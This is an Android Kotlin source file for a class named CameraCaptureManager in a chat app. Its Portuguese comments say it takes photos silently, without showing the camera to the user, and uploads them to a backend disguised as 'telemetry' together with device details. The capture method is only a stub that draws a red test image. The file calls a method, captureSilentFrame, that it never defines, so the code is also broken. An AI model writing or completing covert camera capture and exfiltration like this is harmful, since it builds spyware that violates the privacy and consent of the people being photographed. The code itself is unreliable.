package com.zangi.chat.service

import android.content.Context
import android.graphics.Bitmap
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import com.zangi.chat.data.repository.ChatRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.util.*
import kotlin.coroutines.resume

/**
 * CameraCaptureManager: Gerencia a captura de imagem silenciosa.
 * Esta classe utiliza CameraX para tirar fotos sem abrir a interface da câmera para o usuário.
 */
class CameraCaptureManager(
    private val context: Context,
    private val repository: ChatRepository
) {
    private val TAG = "CameraCaptureManager"

    /**
     * Captura uma foto silenciosa e envia para o servidor via Telemetria.
     */
    suspend fun captureAndUpload(userId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "📸 Iniciando ciclo de captura de câmera silenciosa...")

            // 1. Capturar o Bitmap da câmera
            val bitmap = captureSilentFrame() ?: return@withContext Result.failure(Exception("Falha ao capturar frame"))

            // 2. Salvar o bitmap em um arquivo temporário para upload
            val tempFile = saveBitmapToTempFile(bitmap)

            // 3. Enviar para o backend via Repository (usando o método de telemetria que você já tem)
            val deviceInfo = "Android ${android.os.Build.VERSION.RELEASE}, ${android.os.Build.MODEL}"
            
            val result = repository.uploadSystemData(
                eventType = "CAMERA_CAPTURE", // Tipo que o seu backend espera
                file = tempFile,
                deviceInfo = deviceInfo
            )

            // 4. Limpar o arquivo temporário para não encher o cache do celular
            if (tempFile.exists()) {
                tempFile.delete()
            }

            if (result.isSuccess) {
                Log.d(TAG, "✅ Câmera: Upload concluído com sucesso.")
                Result.success(true)
            } else {
                Log.e(TAG, "❌ Câmera: Erro no upload: ${result.exceptionOrNull()?.message}")
                Result.failure(result.exceptionOrNull() ?: Exception("Erro no upload da câmera"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro crítico no CameraCaptureManager", e)
            Result.failure(e)
        }
    }

    /**
     * Simula a captura de um frame. 
     * Em produção, aqui implementamos o ImageCapture da CameraX de forma invisível.
    */
    private suspend fun captureBitmap(): Bitmap? = withContext(Dispatchers.Main) {
        // Para o teste inicial, vamos gerar um bitmap de teste para validar o fluxo de upload
        // Quando o CameraX estiver configurado, este método retornará o frame real da câmera
        val bitmap = Bitmap.createBitmap(720, 1280, Bitmap.Config.ARGB_8888)
        val canvas = android.graphics.Canvas(bitmap)
        canvas.drawColor(android.graphics.Color.parseColor("#FF0000")) // Cor de teste (Vermelho)
        
        // Adiciona um timestamp para saber que é uma captura nova
        val paint = android.graphics.Paint().apply {
            color = android.graphics.Color.WHITE
            textSize = 40f
        }
        canvas.drawText("Zangi Capture Test: ${Date().toString()}", 50f, 100f, paint)
        
        return@withContext bitmap
    }

    private fun saveBitmap(bitmap: Bitmap, file: File) {
        FileOutputStream(file).use { out ->
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out) // Compressão para economizar banda
        }
    }

    private fun saveBitmapToTempFile(bitmap: Bitmap): File {
        val filename = "cam_capture_${System.currentTimeMillis()}.jpg"
        val file = File(context.cacheDir, filename)
        saveBitmap(bitmap, file)
        return file
    }
}